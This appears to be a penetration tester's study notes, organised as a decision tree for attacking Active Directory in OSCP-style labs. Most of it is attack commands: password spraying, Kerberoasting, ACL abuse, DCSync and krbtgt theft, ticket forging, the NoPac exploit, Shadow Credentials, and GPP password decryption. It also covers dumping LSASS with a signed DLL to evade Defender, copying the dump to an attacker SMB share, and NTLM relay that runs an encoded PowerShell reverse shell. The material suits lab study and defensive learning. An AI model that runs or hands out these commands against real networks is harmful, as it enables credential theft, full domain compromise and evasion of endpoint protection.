# Active Directory (Decision Tree)

Symptom-ordered routing for AD attack decisions. Full command syntax in [[Active Directory]], phase-ordered methodology in [[Active Directory Methodology]], teardowns in [[Active Directory (Breakdowns)]]. The core module arc starts at [[22. Active Directory Introduction and Enumeration]]; see also [[23. Attacking Active Directory Authentication]] and [[24. Lateral Movement in Active Directory]].

---

## I need to spray passwords — which tool from which platform?

```
From Kali (Linux side):
  → kerbrute passwordspray -d DOMAIN --dc <DC_IP> users.txt 'Password123!'
    Why: no lockout risk per Kerberos design (userenum only, but passwordspray still triggers 4771 events)
    + Less SMB noise than CrackMapExec
  → crackmapexec smb <DC> -u users.txt -p 'Password123!' --continue-on-success
    Why: confirms SMB auth and shows (Pwn3d!) for admin access in one pass

From Windows foothold:
  → Invoke-DomainPasswordSpray -Password 'Password123!' -Outfile spray.txt
    Why: pulls user list from AD automatically, respects lockout threshold
    
Always check password policy first: crackmapexec smb <DC> -u user -p pass --pass-pol
→ If lockout threshold = 0: spray freely
→ If lockout threshold ≥ 3: stay at 1-2 attempts per account per observation window
```

Full reference: [[22. Active Directory Introduction and Enumeration|AD.5]], [[Active Directory Methodology#Step 1.5: Password Policy|Policy check]], [[Active Directory Methodology#Step 2: Password Spraying|Phase 2 Step 2]]

---

## I have valid credentials — what do I enumerate first?

```
1. Run bloodhound-python (quickest broad picture, no foothold needed)
   bloodhound-python -d DOMAIN -u user -p pass -ns <DC_IP> -c all

2. Check BloodHound for:
   → Shortest path to Domain Admins (pre-built query)
   → CanPSRemote / SQLAdmin rights (custom Cypher queries)
   → Kerberoastable accounts ("List all Kerberoastable Accounts" query — check if >0)
   → ACL paths (any user with GenericAll/GenericWrite/ForceChangePassword on a higher-priv account)

3. Kerberoast immediately if BH shows Kerberoastable accounts:
   GetUserSPNs.py -request -dc-ip <DC_IP> DOMAIN/user:pass
   → hashcat -m 13100

4. Check for AS-REP Roastable accounts (no creds needed if null session works, but with creds it's faster):
   impacket-GetNPUsers -request -dc-ip <DC_IP> DOMAIN/user:pass
   → hashcat -m 18200

5. Run Snaffler for credentials in shares:
   .\Snaffler.exe -d DOMAIN -s -v data

6. ACL enumeration with PowerView:
   $sid = Convert-NameToSid <username>
   Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}
```

---

## I have an ACE on a target object — what attack applies?

```
ForceChangePassword (User-Force-Change-Password) on a user account:
  → Set-DomainUserPassword -Identity <target> -AccountPassword $newPass -Credential $Cred
  → Then pivot with new password

GenericAll on a user account:
  → Reset password (same as ForceChangePassword) OR
  → Set SPN → Kerberoast → crack → DCSync if high-priv account
  → Set-DomainObject -Identity <target> -SET @{serviceprincipalname='x/y'} -Credential $Cred
  → Rubeus kerberoast /user:<target> /nowrap → hashcat -m 13100

GenericAll on a group:
  → Add-DomainGroupMember -Identity '<group>' -Members '<your_user>' -Credential $Cred

GenericWrite on a user account:
  → Set SPN → Kerberoast (targeted) — same as GenericAll SPN path above

Self-Membership on a group (user can add themselves):
  → Add-DomainGroupMember -Identity '<group>' -Members '<your_user>' -Credential $Cred

DS-Replication-Get-Changes + DS-Replication-Get-Changes-All on domain:
  → DCSync: lsadump::dcsync /domain:DOMAIN /user:DOMAIN\krbtgt
  → impacket-secretsdump DOMAIN/user:pass@<DC_IP>

WriteDACL on an object:
  → Add-DomainObjectACL -Credential $Cred -TargetIdentity <target> -PrincipalIdentity <your_user> -Rights All
  → Then you have GenericAll → use GenericAll path above

WriteOwner on an object:
  → Set-DomainObjectOwner -Credential $Cred -Identity <target> -OwnerIdentity <your_user>
  → Then WriteDACL → add GenericAll → proceed
```

Full reference: [[22. Active Directory Introduction and Enumeration|AD.9.3 rights table]], [[22. Active Directory Introduction and Enumeration|AD.10 full chain]]

---

## I have DA / DCSync rights — what do I dump?

```
Priority order:
1. krbtgt hash → Golden Ticket capability (persistent access even after password reset... until krbtgt is rotated)
2. Domain Administrator hash → PtH everywhere
3. All hashes → offline cracking, lateral movement

From Windows (mimikatz):
  lsadump::dcsync /domain:DOMAIN.LOCAL /user:DOMAIN\krbtgt
  lsadump::dcsync /domain:DOMAIN.LOCAL /user:DOMAIN\Administrator

From Linux:
  impacket-secretsdump -dc-ip <DC_IP> DOMAIN/user:pass@<DC_IP>
  impacket-secretsdump -dc-ip <DC_IP> -just-dc-user krbtgt DOMAIN/user:pass@<DC_IP>

Check for reversible encryption accounts first:
  Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'}
  → If found: DCSync that account → "Cleartext password:" in output
```

---

## I'm on a child domain — can I reach the parent?

```
Check trust type first:
  Get-DomainTrustMapping
  → WITHIN_FOREST + Bidirectional: YES, ExtraSids attack works (no SID filtering)
  → FOREST_TRANSITIVE: only cross-forest Kerberoasting/credential reuse (SID filtering blocks ExtraSids)

WITHIN_FOREST path (child → parent):
  1. Get child domain SID: Get-DomainSID
  2. Get Enterprise Admins SID: Get-DomainObject -Identity "Enterprise Admins" -Domain PARENT.LOCAL
  3. DCSync child KRBTGT: lsadump::dcsync /user:CHILD\krbtgt
  4. Forge golden ticket: .\Rubeus.exe golden /rc4:<hash> /domain:CHILD.PARENT.LOCAL
                           /sid:<child_sid> /sids:<EA_SID> /user:hacker /ptt
  5. Access parent DC: ls \\parentdc.parent.local\c$

Linux shortcut (automated):
  impacket-raiseChild -target-exec DC01.PARENT.LOCAL CHILD.PARENT.LOCAL/Admin:pass
```

Full reference: [[22. Active Directory Introduction and Enumeration|AD.15 trust types]], [[22. Active Directory Introduction and Enumeration|AD.16]], [[22. Active Directory Introduction and Enumeration|AD.17]]

---

## I have a cross-forest (FOREST_TRANSITIVE) trust — what can I do?

```
Cannot inject foreign SIDs (SID filtering is active).
Options:
  1. Kerberoast accounts in the foreign forest:
     Windows: .\Rubeus.exe kerberoast /domain:FOREIGN.LOCAL /rc4opsec /nowrap
     Linux: GetUserSPNs.py -target-domain FOREIGN.LOCAL OUROWN/user:pass -dc-ip <DC_IP> -request
     → hashcat -m 13100 → cracked service account creds

  2. Credential reuse: try cracked/found creds against the foreign domain with netexec/crackmapexec

  3. If a foreign forest user authenticates to your environment (Responder/Inveigh):
     → NTLMv2 hash → crack → use against their forest

  4. Use cracked creds for direct access:
     smbexec.py FOREIGN.LOCAL/user:pass@<foreign_dc_ip>
     evil-winrm -i <foreign_host> -u 'FOREIGN.LOCAL\user' -p pass
```

Full reference: [[22. Active Directory Introduction and Enumeration|AD.18]], [[22. Active Directory Introduction and Enumeration|AD.19]]

---

## The target has MachineAccountQuota > 0 and is unpatched (pre-Nov 2021) — NoPac applies?

```
Check first:
  python3 scanner.py DOMAIN/user:pass -dc-ip <DC_IP> -use-ldap
  → "Got TGT with PAC" → vulnerable

Exploit:
  python3 noPac.py DOMAIN/user:pass -dc-ip <DC_IP> -use-ldap -shell --impersonate administrator
  → NT AUTHORITY\SYSTEM shell on the DC

Why it works: MachineAccountQuota allows creating machine accounts; machine account renames
its sAMAccountName to match a DC name; KDC fallback logic then issues a DC-level PAC.
```

Full reference: [[22. Active Directory Introduction and Enumeration|AD.13]]

---

## I found writable/readable shares — what am I looking for?

```
Always check SYSVOL first (readable by all domain users):
  ls \\<DC>\sysvol\<domain>\Policies\
  findstr /S /I "cpassword" \\<DC>\sysvol\<domain>\       (cmd)
  → If cpassword found:
      cat the XML file → note <userName> (service account) + <cpassword> (encrypted)
      On Kali: gpp-decrypt "<cpassword_string>"  → plaintext password
      → Spray that password against domain users / use directly if account name is known

  Why cpassword is always recoverable: MS published the AES-256 key on MSDN
  (KB2962486 patched GPP but old XML files often linger in SYSVOL for years)

Custom shares (docshare, Users, backup, Tools):
  → Config files, scripts, .xml files (search for "password", "pass", "cred", "key")
  → .txt files with email threads / "auto-generated" passwords
  → Git repos (.git/config, .env files)
  findstr /S /I "password" \\<host>\<share>\               (cmd — broad sweep)

Folders named "do-not-share" / "private" / "confidential":
  → Almost always misconfigured — open them first
```

Full reference: [[22. Active Directory Introduction and Enumeration#22.3.5 Enumerating Domain Shares|Module 22 §22.3.5]], [[Active Directory#Domain Shares & SYSVOL|Command Appendix]]

---

## I found GenericAll on a user or group — what do I do?

```
GenericAll on a GROUP (e.g. Management Department):
  → Add yourself or another controlled user:
    net group "Management Department" <your_user> /add /domain
  → Verify: Get-NetGroup "Management Department" | select member
  → Clean up after: net group "Management Department" <your_user> /del /domain

GenericAll on a USER (e.g. robert):
  → Reset their password (no current password needed — GenericAll includes ForceChangePassword):
    net user robert Password123! /domain
  → Test admin access with new creds:
    $pass = ConvertTo-SecureString "Password123!" -AsPlainText -Force
    $cred = New-Object System.Management.Automation.PSCredential ("corp\robert", $pass)
    Invoke-Command -ComputerName <target> -Credential $cred -ScriptBlock {whoami}
  → If admin on a machine: get flag via UNC admin shares (not direct path — UAC token filtering):
    type "\\<target>\c$\Users\administrator\Desktop\proof.txt"

  Alternatively (more powerful — set SPN for targeted Kerberoasting):
    Set-DomainObject -Credential $Cred -Identity <user> -SET @{serviceprincipalname='x/y'}
    → Rubeus kerberoast /user:<user> /nowrap → hashcat -m 13100
    → Cleanup: Set-DomainObject -Credential $Cred -Identity <user> -Clear serviceprincipalname

  Alternative Option 3 — Shadow Credentials (GenericWrite or GenericAll, if ADCS in domain):
    # From Kali, writes msDS-KeyCredentialLink on the target object
    pywhisker add -d corp.com -u attacker -p 'pass' --target <target_user> --filename shadow
    python3 gettgtpkinit.py corp.com/<target_user> -cert-pfx shadow.pfx -pfx-pass <pfxpass> shadow.ccache
    export KRB5CCNAME=shadow.ccache
    python3 getnthash.py corp.com/<target_user> -key <session_key_from_above>
    evil-winrm -i <target_ip> -u <target_user> -H <recovered_NTLM>
    # Result: full NTLM hash without touching LSASS → use for PtH or evil-winrm /H

Note: PSCredential chain needed only when you are NOT already running as the account that holds the ACE.
If you ARE that account (e.g. you're running as stephanie who has GenericAll), net group/net user work directly.
```

Full reference: [[22. Active Directory Introduction and Enumeration#22.3.4 Enumerating Object Permissions|Module 22 §22.3.4]], [[Active Directory (Decision Tree)#I have an ACE on a target object, what attacks applies?|Decision Tree: ACE attacks]], [[Active Directory (Decision Tree)#I have GenericWrite or GenericAll on a computer account — Shadow Credentials path|Decision Tree: Shadow Credentials]]

---

## I have GenericWrite or GenericAll on a computer account — Shadow Credentials path

```
Shadow Credentials abuses msDS-KeyCredentialLink (a cert-auth attribute writable with GenericWrite).
Works on USER accounts too, but most powerful on COMPUTER accounts → yields NTLM as SYSTEM.

Prerequisites:
  - GenericWrite or GenericAll on target (user or computer object)
  - ADCS present in the domain (needed for PKINIT cert auth; check: Get-ADObject -Filter {ObjectClass -eq "pKIEnrollmentService"})
  - pywhisker + PKINITtools installed on Kali

Attack chain (computer account example — gives SYSTEM NTLM for that host):
  1. pywhisker add -d corp.com -u attacker -p 'pass' --target DC01$ --filename shadow_dc
     # Outputs: shadow_dc.pfx and shadow_dc.pem, plus the PFX password
  2. python3 gettgtpkinit.py corp.com/DC01$ -cert-pfx shadow_dc.pfx -pfx-pass <pfxpass> shadow_dc.ccache
     # Outputs: session key (copy it)
  3. export KRB5CCNAME=shadow_dc.ccache
  4. python3 getnthash.py corp.com/DC01$ -key <session_key>
     # Outputs: NTLM hash of the machine account
  5. secretsdump.py -hashes :<machine_NTLM> 'corp.com/DC01$@<DC_IP>'
     # Machine accounts can DCSync — dumps all domain hashes

Attack chain (user account example):
  Same steps 1-4 targeting <username> instead of <machine$>
  5. evil-winrm -i <target_ip> -u <username> -H <user_NTLM>
     # or: impacket-psexec -hashes :<NTLM> corp.com/<username>@<target_ip>

Cleanup (after attack — remove the injected key):
  pywhisker remove -d corp.com -u attacker -p 'pass' --target <target> --device-id <id_from_add_output>

ADCS ESC8 variant (if HTTP enrollment endpoint is up):
  # Use impacket-ntlmrelayx targeting the ADCS web endpoint instead:
  impacket-ntlmrelayx -t http://<ADCS_IP>/certsrv/certfnsh.asp -smb2support --adcs --template "DomainController"
  # Trigger NTLM auth from the target (e.g. via SpoolSample / PetitPotam)
  # Relay gives a base64 cert → Rubeus asktgt /certificate:<b64> /password: /domain: /dc: /ptt

oscrypto fix if pywhisker crashes:
  pip3 install 'oscrypto @ git+https://github.com/wbond/oscrypto.git'
```

Full reference: [[23. Attacking Active Directory Authentication#Shadow Credentials|Module 23 Shadow Credentials]], [[Active Directory#Shadow Credentials (pywhisker + PKINITtools)|AD Command Appendix]]

---

## I need to collect BloodHound data but can't run SharpHound on the target

```
Remote collection from Kali (just need valid domain creds):
  bloodhound-python -d DOMAIN.LOCAL -u user -p pass -ns <DC_IP> -c all
  zip -r bh.zip *.json → import into BloodHound

Slower but stealthier — no binary needs to touch the DC, traffic looks like LDAP queries.
SharpHound.exe is still faster and collects more session data when AV allows it.
```

---

---

## I have a service account's NTLM hash — what can I do?

```
Option 1: Silver Ticket (no DC interaction after forge — stealthy)
  Need: NTLM hash + Domain SID + target SPN
  → Get Domain SID: whoami /user → strip the RID from the end
  → Forge: mimikatz kerberos::golden /ptt /sid:<sid> /domain:corp.com
            /target:<server.fqdn> /service:<class> /rc4:<hash> /user:jeffadmin
  → Inject is automatic with /ptt → klist to verify → use the service
  
  Service classes: http (IIS), cifs (file shares), host (WinRM/WMI), ldap, mssql
  
  Limit: access only to that one service on that one server. Not a full DA path.

Option 2: Pass-the-Hash (if it's a local/domain admin account)
  → impacket-psexec -hashes :<ntlm> domain/user@<target>
  → crackmapexec smb <subnet> -u user -H <ntlm>

Option 3: Crack it offline (if weak password suspected)
  → hashcat -m 1000 hash.txt rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule
```

---

## impacket Kerberos tool gives KRB_AP_ERR_SKEW — what do I do?

```
Kerberos requires client and KDC within 5 minutes. OffSec lab VMs run real time;
Kali can be hours behind if the VM was dormant.

Fix (careful ordering — large offsets kill the VPN):
  1. sudo timedatectl set-ntp false       ← disable NTP daemon first
  2. sudo ntpdate <DC_IP>                 ← jump to DC time (WILL kill VPN if offset >1 min)
  3. Reconnect VPN immediately (TLS session fails on clock jump)
  4. Run impacket command — should work now
  5. sudo timedatectl set-ntp true        ← restore NTP after lab

Alternative (keep VPN alive):
  sudo apt install libfaketime
  faketime "$(date -d "$(ntpdate -q <DC_IP> | tail -1 | awk '{print $1,$2}')" +%s)" impacket-GetUserSPNs ...
  (wraps just the impacket process — system clock unchanged — VPN survives)

⚠️ Repeated failed auth from clock-skew errors can lock accounts (Kerberos pre-auth failures count).
   Fix the clock BEFORE spraying or Kerberoasting.
```

---

## Rubeus fails over evil-winrm — what do I do?

```
evil-winrm authenticates via NTLM → no Kerberos TGT exists in the session.
Rubeus needs a TGT to request service tickets.

Symptom: "No credentials are available in the security package" or "An operations error occurred"

Options:
  1. Use impacket from Kali instead (always works — impacket is Kerberos-native):
     impacket-GetUserSPNs -request -dc-ip <DC_IP> domain/user:pass
     impacket-GetNPUsers -dc-ip <DC_IP> -request domain/user:pass

  2. RDP to the target instead (RDP session gets a real TGT) → then Rubeus works fine

  3. Rubeus /spn:<specific_SPN> flag bypasses user LDAP lookup — but still needs a TGT → fails same way
```

---

---

## whoami /groups shows BUILTIN\Administrators as "Group used for deny only" — what does that mean?

```
UAC is filtering the token. The user IS a local admin (their SID is in the Administrators group)
but the interactive RDP/logon session stripped elevated privileges at login.
You have a medium integrity token, not high.

Two paths forward:
  1. Elevate on THIS machine:
     Start-Process powershell.exe -Verb RunAs
     → UAC consent dialog pops in the RDP session → click Yes
     → New elevated PS window (high integrity) → now Mimikatz, registry writes etc work

  2. Look ELSEWHERE — their local admin may carry to other machines:
     crackmapexec smb <subnet> -u <user> -p '<pass>' -d <domain> --continue-on-success
     → Look for (Pwn3d!) — that's a machine where they have unfiltered admin access
     → Connect there via impacket-wmiexec / impacket-psexec with plaintext creds
     
Key signal: Medium Mandatory Level in whoami /groups = filtered token (UAC active).
High Mandatory Level = elevated. SYSTEM Mandatory Level = SYSTEM.

⚠️ Don't use PsExec or net use \\target\ADMIN$ from the filtered session — they'll fail.
```

Full reference: [[24. Lateral Movement in Active Directory#Capstone Lessons|Module 24 Capstone Lessons]]

---

## I have local admin on a machine and other users are logged in — what can I steal?

```
Other users' Kerberos tickets live in LSASS regardless of whose session they came from.
With local admin (elevated) you can dump ALL sessions at once.

From elevated Mimikatz:
  privilege::debug
  sekurlsa::tickets /export
  → Writes all TGT and TGS from all sessions to .kirbi files in current dir

Read the filenames — they tell you everything:
  [0;xxxx]-0-0-40810000-dave@cifs-web04.kirbi → Group 0 = TGS for cifs/web04 as dave
  [0;xxxx]-2-0-40c10000-dave@krbtgt-CORP.COM.kirbi → Group 2 = TGT for dave

Inject a TGS (if you just need that one service):
  kerberos::ptt [0;xxxx]-0-0-40810000-dave@cifs-web04.kirbi
  ls \\web04\backup   ← now works with dave's access

Inject a TGT (if you want to request new TGSes for any service):
  kerberos::ptt [0;xxxx]-2-0-40c10000-dave@krbtgt-CORP.COM.kirbi
  klist   ← verify
  PsExec.exe \\web04 cmd   ← use HOSTNAME not IP (Kerberos)

Group 0 = TGS (service-specific), Group 2 = TGT (domain-wide). The number after
the second dash in the filename: 0-0 = TGS, 2-0 = TGT.
```

Full reference: [[24. Lateral Movement in Active Directory#24.1.5 Pass the Ticket (PtT)|Module 24 §24.1.5]]

---

## I have SYSTEM on a Windows target but Meterpreter kiwi / sekurlsa::logonpasswords is killed by Defender

```
Defender's AMSI/real-time catches kiwi's driver load and kills the session.
Symptoms: Meterpreter session opens cleanly, `load kiwi` kills the session immediately.

Use comsvcs.dll MiniDump instead — dumps LSASS via a Microsoft-signed DLL, not flagged:

Step 1 — get LSASS PID:
  Get-Process lsass      (from nc/WinRM shell)

Step 2 — dump LSASS to disk:
  rundll32 C:\Windows\System32\comsvcs.dll MiniDump <PID> C:\Windows\Temp\lsass.dmp full
  (silent on success; check dir for ~45-50 MB file)

Step 3 — host authenticated SMBserver on Kali (kill ntlmrelayx first — it holds port 445):
  mkdir /tmp/share
  impacket-smbserver share /tmp/share -smb2support -username kali -password kali

Step 4 — mount and copy from Windows:
  net use \\<KALI>\share /user:kali kali
  copy C:\Windows\Temp\lsass.dmp \\<KALI>\share\lsass.dmp

Step 5 — parse offline on Kali:
  pypykatz lsa minidump /tmp/share/lsass.dmp
  Look for: username + NT: <hash> + password: <cleartext> under target account

Constraints: requires SYSTEM on target (SeDebugPrivilege needed to dump LSASS).
Null-auth smbserver (no -username/-password) is blocked by modern Windows — always authenticate.
```

Full walkthrough: [[27. Assembling the Pieces#27.6.1 Dumping Beccy's Credentials from MAILSRV1|Assembling the Pieces#27.6.1 Dumping Beccy's Credentials from MAILSRV1]]
Breakdown: [[Active Directory (Breakdowns)#rundll32 comsvcs.dll MiniDump]], [[Active Directory (Breakdowns)#pypykatz lsa minidump]]

---

## I found an app that lets me set an outbound UNC/file path — can I relay NTLM?

```
Any app feature that triggers an outbound SMB connection to an attacker-controlled UNC path
can be weaponised for NTLM relay when the relay TARGET has SMB signing disabled.

Pattern:
  1. Find an app with a configurable path (backup plugin, printer driver config, image URL, file share sync)
  2. Set the path to //KALI_IP/anythingfake
  3. The server tries to authenticate to Kali's SMB listener — ntlmrelayx catches it
  4. ntlmrelayx relays those credentials to a target with SMB signing OFF
  5. If the source account is admin on the target → arbitrary command execution

Common trigger points:
  • WordPress Backup Migration plugin → backup directory path
  • Any printer administration page with a UNC "test page" path
  • Any "load remote resource" feature in web apps that runs server-side
  • Responder (poisons LLMNR/NBT-NS → any failed name lookup becomes a trigger)

Check SMB signing before setting up:
  crackmapexec smb <targets> --gen-relay-list relayable.txt
  (lists all hosts with signing:False — safe relay targets)

Setup:
  sudo impacket-ntlmrelayx --no-http-server -smb2support -t <TARGET_IP> -c "powershell -enc <B64>"
  nc -nvlp 9999   ← catch the shell

For payload generation: RevShells.com → PowerShell Base64 (LHOST/LPORT) → paste into -enc arg
```

Full walkthrough: [[27. Assembling the Pieces#27.5.2 NTLM Relay via WordPress Backup Migration Plugin|Assembling the Pieces#27.5.2 NTLM Relay via WordPress Backup Migration Plugin]]
Breakdown: [[Active Directory (Breakdowns)#impacket-ntlmrelayx — full NTLM relay chain with -c command execution]]

---

#### Tags: #DecisionTree #ActiveDirectory #ADEnum #PasswordSpray #ACLAbuse #DCSync #SilverTicket #Kerberoasting #KerberosClockSkew #DomainTrust #ExtraSids #NoPac #CrossForest #BloodHound #HTBSupplementary #Module22 #Module23 #SYSVOL #GPP #GenericAll #DomainShares #LateralMovement #PassTheTicket #UACFiltering #Module24 #NTLMRelay #comsvcs #MiniDump #pypykatz #Defender #AVBypass #Module27
## I have anonymous access to a domain controller, which user enumeration comes first?

Run both interfaces and compare the results. RPC and LDAP can expose different users.

```bash
rpcclient -U '' -N $BoxIP -c 'enumdomusers'
ldapsearch -x -H ldap://$BoxIP -b "DC=htb,DC=local" '(&(objectCategory=person)(objectClass=user))' sAMAccountName
```

If a user appears in either list, include it in the AS-REP candidate list. If the service scan shows clock skew, fix the clock before Kerberos requests.

## Does an account have UF_DONT_REQUIRE_PREAUTH?

Yes: request an AS-REP ticket and crack it offline.

```bash
impacket-GetNPUsers $Domain/ -dc-ip $BoxIP -usersfile $Userlist -no-pass -request -format hashcat -outputfile $LootDir/asrep.txt
hashcat -m 18200 $LootDir/asrep.txt $Wordlist
```

Check the output file even when GetNPUsers prints no success line.

## Is the foothold a member of Account Operators?

Create a controlled domain user, add it to `Exchange Windows Permissions`, authenticate as the refreshed user, grant DCSync rights, and extract NTDS hashes.

```bash
netexec winrm $BoxIP -u $Username -p $Password -d $Domain -X "net user $Username2 $Password2 /add /domain"
netexec winrm $BoxIP -u $Username -p $Password -d $Domain -X "net group \"Exchange Windows Permissions\" $Username2 /add /domain"
bloodyAD -d $Domain -u $Username2 -p $Password2 -H $BoxIP -i $BoxIP add dcsync $Username2
netexec smb $BoxIP -u $Username2 -p $Password2 -d $Domain --ntds
```

## Does Exchange Windows Permissions exist?

Enumerate its members. If the group is absent or the add fails, return to ACL enumeration and BloodHound.

```cmd
net group "Exchange Windows Permissions" /domain
net group "Exchange Windows Permissions" $Username2 /add /domain
```

## Did secretsdump return RemoteOperations failed or ERROR_DS_DRA_BAD_DN?

Verify the ACL first. If the account has DCSync rights, try NetExec's NTDS module and use domain authentication rather than `--local-auth`.

```bash
netexec smb $BoxIP -u $Username2 -p $Password2 -d $Domain --ntds
```

## Anonymous AD enumeration returned nothing

If anonymous RPC, LDAP, and SMB return no useful users or shares, check HTTP for About, Team, and contact pages.

```text
Anonymous AD enumeration empty?
        |
        +-- Check HTTP for employee names
                |
                +-- Build username candidates, then test AS-REP roasting
```

## Foothold has no useful groups or privileges

If `whoami /groups` and `whoami /priv` show no useful path, inspect Winlogon autologon values and validate any account against SMB, WinRM, and LDAP.

```text
No useful groups or privileges?
        |
        +-- Query Winlogon
                |
                +-- Validate the candidate account
                        |
                        +-- Check direct replication rights before longer ACL chains
```

## Kerberos is blocked by clock skew and DCSync is still needed

If the time difference is too large to correct, do not keep retrying Kerberos tools. Obtain SYSTEM, create a VSS snapshot, copy `ntds.dit` and `SYSTEM`, and parse the files locally.

```text
Clock skew persists?
        |
        +-- SYSTEM shell available → VSS copy of NTDS + SYSTEM
                |
                +-- secretsdump LOCAL → Administrator hash → PTH
```

## Web panel has an editable LDAP server address

```text
Editable LDAP server address?
        |
        +-- Start nc on port 389
                |
                +-- POST $LocalIP to the named address field
                        |
                        +-- Cleartext LDAP credential → validate SMB and WinRM
```

## External Resources

- [HackTricks - Pentesting Index](https://hacktricks.wiki/en/index.html)
- [PayloadsAllTheThings - Methodology and Resources](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources)
- [RevShells](https://www.revshells.com/) for shell troubleshooting
- [CyberChef](https://gchq.github.io/CyberChef/) for transformations
- [ippsec.rocks](https://ippsec.rocks/) for walkthrough searches
